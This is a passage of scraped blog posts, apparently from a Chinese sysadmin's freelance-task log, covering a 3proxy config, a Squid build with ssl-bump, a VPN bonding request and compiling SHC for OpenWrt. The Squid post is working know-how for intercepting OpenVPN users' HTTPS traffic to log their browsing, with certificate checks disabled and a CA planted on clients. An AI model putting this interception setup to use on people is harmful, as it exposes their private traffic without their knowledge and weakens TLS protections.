\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e注意上面我是安装到了/usr/local/3proxy，大家可以根据需求修改。\u003c/p\u003e\n\u003cp\u003e看看配置都是什么\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ecat cfg/3proxy.cfg.sample \u003cspan class=\"p\"\u003e|\u003c/span\u003egrep -v ^# \u003cspan class=\"p\"\u003e|\u003c/span\u003e grep -v ^$  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enserver 10.1.2.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enserver 10.2.2.2  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003enscache \u003cspan class=\"m\"\u003e65536\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etimeouts \u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"m\"\u003e5\u003c/span\u003e \u003cspan class=\"m\"\u003e30\u003c/span\u003e \u003cspan class=\"m\"\u003e60\u003c/span\u003e \u003cspan class=\"m\"\u003e180\u003c/span\u003e \u003cspan class=\"m\"\u003e1800\u003c/span\u003e \u003cspan class=\"m\"\u003e15\u003c/span\u003e \u003cspan class=\"m\"\u003e60\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eusers 3APA3A:CL:3apa3a \u003cspan class=\"s2\"\u003e\u0026#34;test:CR:\u003c/span\u003e\u003cspan class=\"nv\"\u003e$1$qwer$CHFTUFGqkjue9HyhcMHEe1\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eservice  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elog c:\u003cspan class=\"se\"\u003e\\3\u003c/span\u003eproxy\u003cspan class=\"se\"\u003e\\l\u003c/span\u003eogs\u003cspan class=\"se\"\u003e\\3\u003c/span\u003eproxy.log D  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003elogformat \u003cspan class=\"s2\"\u003e\u0026#34;- +_L%t.%.  %N.%p %E %U %C:%c %R:%r %O %I %h %T\u0026#34;\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003earchiver rar rar a -df -inul %A %F  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003erotate \u003cspan class=\"m\"\u003e30\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth iponly  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eexternal 10.1.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einternal 192.168.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth none  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ednspr  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth strong  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003edeny * * 127.0.0.1,192.168.1.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow * * * 80-88,8080-8088 HTTP  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow * * * 443,8443 HTTPS  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eproxy -n  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth none  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003epop3p  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etcppm \u003cspan class=\"m\"\u003e25\u003c/span\u003e mail.my.provider \u003cspan class=\"m\"\u003e25\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth strong  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eflush  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow 3APA3A,test  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emaxconn \u003cspan class=\"m\"\u003e20\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esocks  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eauth strong  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eflush  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003einternal 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eallow 3APA3A 127.0.0.1  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emaxconn \u003cspan class=\"m\"\u003e3\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eadmin  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e一堆的废物配置啊，统统去掉\u003c/p\u003e","title":"Freelancer任务之三：Setup Proxy on VPS for Instagram"},{"content":"这个需求也比较简单：\nUser Browsing Log for Open VPN server\n简单说就是用户连到他的openvpn服务器，通过上面的squid代理来浏览其他网站，比较特别的是需要查看用户http和https的浏览记录。\nsquid做透明代理，这样就可以截取浏览记录并且提供加速了\n服务器是Ubuntu，缺省安装的的squid是不支持SSL的，所以需要重新编译一个\n安装依赖包：\nsudo apt-get install build-essential fakeroot devscripts gawk gcc-multilib dpatch sudo apt-get build-dep squid3 sudo apt-get build-dep openssl sudo apt-get install libssl-dev sudo apt-get source squid3 下载到squid的源代码，以及ubuntu的修改包，解压并释放：\ntar zxvf squid3_3.5.12.orig.tar.gz cd squid3-3.5.12 tar xf ../squid3_3.5.12-1ubuntu7.5.debian.tar.xz 修改参数增加对ssl的支持：\nvi debian/rules Add --with-openssl --enable-ssl --enable-ssl-crtd under the DEB_CONFIGURE_EXTRA_FLAGS section. DEB_CONFIGURE_EXTRA_FLAGS := BUILDCXXFLAGS=\u0026#34;$(CXXFLAGS) $(LDFLAGS)\u0026#34; \\ ... --with-default-user=proxy \\ --with-openssl \\ --enable-ssl \\ --enable-ssl-crtd ... 编译，会生成7个deb包\ndebuild -us -uc -b cd .. ls -1 *.deb squid3_3.5.12-1ubuntu7.5_all.deb squid_3.5.12-1ubuntu7.5_amd64.deb squid-cgi_3.5.12-1ubuntu7.5_amd64.deb squidclient_3.5.12-1ubuntu7.5_amd64.deb squid-common_3.5.12-1ubuntu7.5_all.deb squid-dbg_3.5.12-1ubuntu7.5_amd64.deb squid-purge_3.5.12-1ubuntu7.5_amd64.deb 安装，先装语言包，然后安装三个自己生成的包\nsudo apt-get install squid-langpack sudo dpkg -i squid_3.5.12-1ubuntu7.5_amd64.deb squid-common_3.5.12-1ubuntu7.5_all.deb squid-dbg_3.5.12-1ubuntu7.5_amd64.deb 检查一下新的squid是否支持ssl了\nsquid -v|grep ssl configure options: \u0026#39;--build=x86_64-linux-gnu\u0026#39; \u0026#39;--prefix=/usr\u0026#39; \u0026#39;--includedir=${prefix}/include\u0026#39; \u0026#39;--mandir=${prefix}/share/man\u0026#39; \u0026#39;--infodir=${prefix}/share/info\u0026#39; \u0026#39;--sysconfdir=/etc\u0026#39; \u0026#39;--localstatedir=/var\u0026#39; \u0026#39;--libexecdir=${prefix}/lib/squid3\u0026#39; \u0026#39;--srcdir=.\u0026#39; \u0026#39;--disable-maintainer-mode\u0026#39; \u0026#39;--disable-dependency-tracking\u0026#39; \u0026#39;--disable-silent-rules\u0026#39; \u0026#39;BUILDCXXFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now\u0026#39; \u0026#39;--datadir=/usr/share/squid\u0026#39; \u0026#39;--sysconfdir=/etc/squid\u0026#39; \u0026#39;--libexecdir=/usr/lib/squid\u0026#39; \u0026#39;--mandir=/usr/share/man\u0026#39; \u0026#39;--enable-inline\u0026#39; \u0026#39;--disable-arch-native\u0026#39; \u0026#39;--enable-async-io=8\u0026#39; \u0026#39;--enable-storeio=ufs,aufs,diskd,rock\u0026#39; \u0026#39;--enable-removal-policies=lru,heap\u0026#39; \u0026#39;--enable-delay-pools\u0026#39; \u0026#39;--enable-cache-digests\u0026#39; \u0026#39;--enable-icap-client\u0026#39; \u0026#39;--enable-follow-x-forwarded-for\u0026#39; \u0026#39;--enable-auth-basic=DB,fake,getpwnam,LDAP,NCSA,NIS,PAM,POP3,RADIUS,SASL,SMB\u0026#39; \u0026#39;--enable-auth-digest=file,LDAP\u0026#39; \u0026#39;--enable-auth-negotiate=kerberos,wrapper\u0026#39; \u0026#39;--enable-auth-ntlm=fake,smb_lm\u0026#39; \u0026#39;--enable-external-acl-helpers=file_userip,kerberos_ldap_group,LDAP_group,session,SQL_session,unix_group,wbinfo_group\u0026#39; \u0026#39;--enable-url-rewrite-helpers=fake\u0026#39; \u0026#39;--enable-eui\u0026#39; \u0026#39;--enable-esi\u0026#39; \u0026#39;--enable-icmp\u0026#39; \u0026#39;--enable-zph-qos\u0026#39; \u0026#39;--enable-ecap\u0026#39; \u0026#39;--disable-translation\u0026#39; \u0026#39;--with-swapdir=/var/spool/squid\u0026#39; \u0026#39;--with-logdir=/var/log/squid\u0026#39; \u0026#39;--with-pidfile=/var/run/squid.pid\u0026#39; \u0026#39;--with-filedescriptors=65536\u0026#39; \u0026#39;--with-large-files\u0026#39; \u0026#39;--with-default-user=proxy\u0026#39; \u0026#39;--with-openssl\u0026#39; \u0026#39;--enable-ssl\u0026#39; \u0026#39;--enable-ssl-crtd\u0026#39; \u0026#39;--enable-build-info=Ubuntu linux\u0026#39; \u0026#39;--enable-linux-netfilter\u0026#39; \u0026#39;build_alias=x86_64-linux-gnu\u0026#39; \u0026#39;CFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security -Wall\u0026#39; \u0026#39;LDFLAGS=-Wl,-Bsymbolic-functions -fPIE -pie -Wl,-z,relro -Wl,-z,now\u0026#39; \u0026#39;CPPFLAGS=-Wdate-time -D_FORTIFY_SOURCE=2\u0026#39; \u0026#39;CXXFLAGS=-g -O2 -fPIE -fstack-protector-strong -Wformat -Werror=format-security\u0026#39; cd /usr/lib/squid ls ssl_crtd Gen出ssl的证书和密钥并拷贝到正确的位置，更新ca-certificates：\nopenssl genrsa -out squid.key 2048 openssl req -new -key squid.key -out squid.csr You are about to be asked to enter information that will be incorporated into your certificate request. What you are about to enter is what is called a Distinguished Name or a DN. There are quite a few fields but you can leave some blank For some fields there will be a default value, If you enter \u0026#39;.\u0026#39;, the field will be left blank. ----- Country Name (2 letter code) [AU]:CN State or Province Name (full name) [Some-State]:Beijing Locality Name (eg, city) []:Beijing Organization Name (eg, company) [Internet Widgits Pty Ltd]:Rendoumi.com Organizational Unit Name (eg, section) []:Rendoumi.com Common Name (e.g. server FQDN or YOUR name) []:159.89.116.192 Email Address []: Please enter the following \u0026#39;extra\u0026#39; attributes to be sent with your certificate request A challenge password []: An optional company name []: openssl x509 -req -days 3650 -in squid.csr -signkey squid.key -out squid.crt Signature ok subject=/C=CN/ST=Beijing/L=Beijing/O=Rendoumi.com/OU=Rendoumi.com/CN=159.89.116.192 Getting Private key sudo cp squid.crt /usr/local/share/ca-certificates sudo /usr/sbin/update-ca-certificates Updating certificates in /etc/ssl/certs... 1 added, 0 removed; done. Running hooks in /etc/ca-certificates/update.d... done. sudo cp squid.pem /etc/squid 修改/etc/squid.conf配置文件\ncd /etc/squid cat squid.conf|grep -v ^# | grep -v ^$ sudo vi /etc/squid/squid.conf ---------------------------------------- acl SSL_ports port 443 acl Safe_ports port 80 # http acl Safe_ports port 21 # ftp acl Safe_ports port 443 # https acl Safe_ports port 70 # gopher acl Safe_ports port 210 # wais acl Safe_ports port 1025-65535 # unregistered ports acl Safe_ports port 280 # http-mgmt acl Safe_ports port 488 # gss-http acl Safe_ports port 591 # filemaker acl Safe_ports port 777 # multiling http acl CONNECT method CONNECT acl localnet src 10.8.0.0/16 http_access deny !Safe_ports http_access deny CONNECT !SSL_ports http_access allow localhost manager http_access deny manager http_access allow localhost http_access allow localnet http_access deny all coredump_dir /var/spool/squid refresh_pattern ^ftp: 1440 20% 10080 refresh_pattern ^gopher: 1440 0% 1440 refresh_pattern -i (/cgi-bin/|\\?) 0 0% 0 refresh_pattern (Release|Packages(.gz)*)$ 0 20% 2880 # example lin deb packages #refresh_pattern (\\.deb|\\.udeb)$ 129600 100% 129600 refresh_pattern . 0 20% 4320 shutdown_lifetime 3 http_port 3128 intercept https_port 3129 intercept ssl-bump generate-host-certificates=on version=1 options=NO_SSLv2,NO_SSLv3,SINGLE_DH_USE dynamic_cert_mem_cache_size=4MB cert=/etc/squid/squid.pem always_direct allow all ssl_bump none localhost ssl_bump server-first all sslproxy_cert_error allow all sslproxy_flags DONT_VERIFY_PEER sslcrtd_program /usr/lib/squid/ssl_crtd -s /var/lib/ssl_db -M 4MB sslcrtd_children 8 startup=1 idle=1 ---------------------------------------- 初始化ssl_db\nsudo /usr/lib/squid/ssl_crtd -c -s /var/lib/ssl_db/ chown -R proxy /var/lib/ssl_db 重启squid\nsudo systemctl restart squid.service 特别的一点，雇主写了巨多的ufw的规则，导致IPTABLE爆满，居然无法手动清除所有的规则，这也是第一次遇到这样的，只能写脚本清除，方法如下：\nvi cl.txt ----------------------- # Empty the entire filter table *filter :INPUT ACCEPT [0:0] :FORWARD ACCEPT [0:0] :OUTPUT ACCEPT [0:0] COMMIT ----------------------- sudo iptables-restore \u0026lt; cl 最后修改IPTABLES，把80和443的请求都送到squid去\nsudo vi /etc/rc.local iptables -t nat -A PREROUTING -p tcp -s 10.8.0.0/24 --dport 80 -j REDIRECT --to-ports 3128 iptables -t nat -A PREROUTING -p tcp -s 10.8.0.0/24 --dport 443 -j REDIRECT --to-ports 3129 iptables -t nat -A POSTROUTING -s 10.8.0.0/24 ! -d 10.8.0.0/24 -j SNAT --to 159.89.116.192 用代理访问，验证一下：\nsudo tail -f /var/log/squid/access.log 这样做有个问题，就是https实际是被劫持代理了，所以客户端会弹出个是否信任证书，除非在每个客户端中预埋，这样才能解决。\nThat is all.\n","permalink":"https://rendoumi.com/posts/20240124-freelancer_4/","summary":"\u003cp\u003e这个需求也比较简单：\u003c/p\u003e\n\u003cp\u003eUser Browsing Log for Open VPN server\u003c/p\u003e\n\u003cp\u003e简单说就是用户连到他的openvpn服务器，通过上面的squid代理来浏览其他网站，比较特别的是需要查看用户http和https的浏览记录。\u003c/p\u003e\n\u003cp\u003esquid做透明代理，这样就可以截取浏览记录并且提供加速了\u003c/p\u003e\n\u003cp\u003e服务器是Ubuntu，缺省安装的的squid是不支持SSL的，所以需要重新编译一个\u003c/p\u003e\n\u003cp\u003e安装依赖包：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install build-essential fakeroot devscripts gawk gcc-multilib dpatch  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get build-dep squid3  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get build-dep openssl  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get install libssl-dev  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt-get \u003cspan class=\"nb\"\u003esource\u003c/span\u003e squid3  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e下载到squid的源代码，以及ubuntu的修改包，解压并释放：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar zxvf squid3_3.5.12.orig.tar.gz  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nb\"\u003ecd\u003c/span\u003e squid3-3.5.12  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003etar xf ../squid3_3.5.12-1ubuntu7.5.debian.tar.xz  \n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e修改参数增加对ssl的支持：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi debian/rules  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eAdd --with-openssl --enable-ssl --enable-ssl-crtd under the DEB_CONFIGURE_EXTRA_FLAGS section.\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eDEB_CONFIGURE_EXTRA_FLAGS :\u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nv\"\u003eBUILDCXXFLAGS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eCXXFLAGS\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e \u003c/span\u003e\u003cspan class=\"k\"\u003e$(\u003c/span\u003eLDFLAGS\u003cspan class=\"k\"\u003e)\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;\u003c/span\u003e \u003cspan class=\"se\"\u003e\\ \u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e                --with-default-user\u003cspan class=\"o\"\u003e=\u003c/span\u003eproxy \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e                --with-openssl \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e                --enable-ssl \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e                --enable-ssl-crtd\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e...\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编译，会生成7个deb包\u003c/p\u003e","title":"Freelancer任务之四squid查询用户浏览记录"},{"content":"这个任务很有意思\n任务描述：\nwe need a set of vpn server / client programmed for embedded linux (or windows) to bond multiple 4g lte modems or wifi connectios and stitch them back together on server side to stream video feeds. the connection must be stable and have the maximum available bandwidth with no drop in some connection drops. simillar to service called SPEEDIFY (but it doesn\u0026#39;t work well) this can be also achieved by splitting video packets and send them through different links and stitch the video packets back on the server side. 简单说，很可能它这边是个嵌入式系统，树莓派、nanopi之流的，接了4G的无线上网卡，想去聚合链路上传流媒体。\n解决方案也很简单，直击痛点。\nhttp://vrayo.com/how-to-set-up-a-bonding-vpn-connection-in-linux/\n这个任务：$250 - $750。\n没空做，任务缠身。\n","permalink":"https://rendoumi.com/posts/20240124-freelancer_5/","summary":"\u003cp\u003e这个任务很有意思\u003c/p\u003e\n\u003cp\u003e任务描述：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ewe need a \u003cspan class=\"nb\"\u003eset\u003c/span\u003e of vpn server / client programmed \u003cspan class=\"k\"\u003efor\u003c/span\u003e embedded linux \u003cspan class=\"o\"\u003e(\u003c/span\u003eor windows\u003cspan class=\"o\"\u003e)\u003c/span\u003e  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eto bond multiple 4g lte modems or wifi connectios and stitch them back together  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003eon server side to stream video feeds. the connection must be stable and have  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ethe maximum available bandwidth with no drop in some connection drops.  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esimillar to service called SPEEDIFY \u003cspan class=\"o\"\u003e(\u003c/span\u003ebut it doesn\u003cspan class=\"err\"\u003e\u0026#39;\u003c/span\u003et work well\u003cspan class=\"o\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003ethis can be also achieved by splitting video packets and send them through  \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e different links and stitch the video packets back on the server side.\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e简单说，很可能它这边是个嵌入式系统，树莓派、nanopi之流的，接了4G的无线上网卡，想去聚合链路上传流媒体。\u003c/p\u003e","title":"Freelancer任务之五多线路聚合vpn"},{"content":"这是一次失败的任务，即使再来一次，依然会失败，因为无法验证，真够shit的，扣了我10$的手续费。\n记录一下，以儆效尤。\n任务如下：\nJob would be to compile an ipk file of SHC that would work with LEDE OS (openwrt) and the processor used in our system - will provide details SHC can be downloaded here: http://www.datsi.fi.upm.es/~frosal/ I think you must have a 64 bit system to use the SDK to compile the file 翻译一下：在OpenWRT平台下编译一个SHC，并且能工作。\n完全步骤如下：\nHow to compile SHC on LEDE: Tested build environment: OS: Ubuntu 14.04.5 LTS CPU: ARMv7 Processor rev 5 (v7l) Before you begin, check your system is updated, i.e. sudo apt-get update sudo apt-get upgrade sudo apt-get autoremove Step-by-step manual: Note: perform all steps as regular (non-root) user. User must be in sudo group. 1. Update your sources sudo apt-get update 2. Install nesessary packages: sudo apt-get install g++ libncurses5-dev zlib1g-dev bison flex unzip autoconf gawk make gettext gcc binutils patch bzip2 libz-dev asciidoc subversion sphinxsearch libtool sphinx-common libssl-dev libssl0.9.8 3. Get latest LEDE source from git repository We know our CPU is armv7, it belongs to arm64, so go to http://downloads.lede-project.org/releases , just download sdk. wget http://downloads.lede-project.org/releases/17.01.4/targets/arm64/generic/lede-sdk-17.01.4-arm64_gcc-5.4.0_musl-1.1.16.Linux-x86_64.tar.xz 4. No Need to Update and install all LEDE packages We just want to compile shc, not other packages , so don\u0026#39;t update. 5. Run \u0026#39;make menuconfig\u0026#39; (Just Save and Exit) 6. Get SHC sources to LEDE package tree (we are and shc-3.8.9b.tgz is in source directory) wget http://www.datsi.fi.upm.es/~frosal/sources/shc-3.8.9b.tgz mkdir -p package/shc/src tar xvf shc-3.8.9b.tgz -C package/shc/src --strip-components 1 7. Make ipk Makefile vi package/shc/Makefile ############################################## # OpenWrt Makefile for shc program # # # Most of the variables used here are defined in # the include directives below. We just need to # specify a basic description of the package, # where to build our program, where to find # the source files, and where to install the # compiled program on the router. # # Be very careful of spacing in this file. # Indents should be tabs, not spaces, and # there should be no trailing whitespace in # lines that are not commented. # ############################################## include $(TOPDIR)/rules.mk # Name and release number of this package PKG_NAME:=shc PKG_VERSION:=3.8.9b PKG_MAINTAINER:=Francisco, Rosales, \u0026lt;frosal@fi.upm.es\u0026gt; # This specifies the directory where we\u0026#39;re going to build the program. # The root build directory, $(BUILD_DIR), is by default the build_mipsel # directory in your OpenWrt SDK directory PKG_BUILD_DIR := $(BUILD_DIR)/$(PKG_NAME) include $(INCLUDE_DIR)/package.mk # Specify package information for this program. # The variables defined here should be self explanatory. # If you are running Kamikaze, delete the DESCRIPTION # variable below and uncomment the Kamikaze define # directive for the description below define Package/$(PKG_NAME) SECTION:=utils CATEGORY:=Utilities TITLE:= shc ---- This tool generates a stripped binary executable version of the script specified at command line. URL:=http://www.datsi.fi.upm.es/~frosal endef # Uncomment portion below for Kamikaze and delete DESCRIPTION variable above define Package/$(PKG_NAME)/description shc ---- This tool generates a stripped binary executable version of the script specified at command line.\u0026#34; endef # Specify what needs to be done to prepare for building the package. # In our case, we need to copy the source files to the build directory. # This is NOT the default. The default uses the PKG_SOURCE_URL and the # PKG_SOURCE which is not defined here to download the source from the web. # In order to just build a simple program that we have just written, it is # much easier to do it this way. define Build/Prepare mkdir -p $(PKG_BUILD_DIR) $(CP) ./src/* $(PKG_BUILD_DIR)/ endef # We do not need to define Build/Configure or Build/Compile directives # The defaults are appropriate for compiling a simple program such as this one # Specify where and how to install the program. Since we only have one file, # the helloworld executable, install it by copying it to the /bin directory on # the router. The $(1) variable represents the root directory on the router running # OpenWrt. The $(INSTALL_DIR) variable contains a command to prepare the install # directory if it does not already exist. Likewise $(INSTALL_BIN) contains the # command to copy the binary file from its current location (in our case the build # directory) to the install directory. define Package/$(PKG_NAME)/install $(INSTALL_DIR) $(1)/bin $(INSTALL_BIN) $(PKG_BUILD_DIR)/shc $(1)/bin/ endef # This line executes the necessary commands to compile our program. # The above define directives specify all the information needed, but this # line calls BuildPackage which in turn actually uses this information to # build a package. $(eval $(call BuildPackage,$(PKG_NAME))) 8. Compile shc ipk without errors. make package/shc/compile V=99 9. Building process complete witout errors. Now we have : binary packages directory: source/bin/packages/aarch64_armv8-a/ [SHC_BIN] = ./bin/packages/aarch64_armv8-a/base/shc_3.8.9b_aarch64_armv8-a.ipk 10. Copy and install SHC .ipk to LEDE device. scp shc_3.8.9b_aarch64_armv8-a.ipk root@\u0026lt;LEDE device IP address or name\u0026gt;:/tmp/ ssh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1 opkg install shc_3.8.9b_aarch64_armv8-a.ipk 11. Create test script and compile it to execute. (in LEDE shell) ssh root@\u0026lt;LEDE device IP address or name\u0026gt; #IP usually 192.168.1.1 vi /tmp/1.sh #!/bin/sh echo \u0026#34;hahahaha\u0026#34; shc -v -f /tmp/1.sh /tmp/1.sh.x 这里面有几个注意点，一个是网上有很多教程，上去就是\n./scripts/feeds update -a ./scripts/feeds install -a 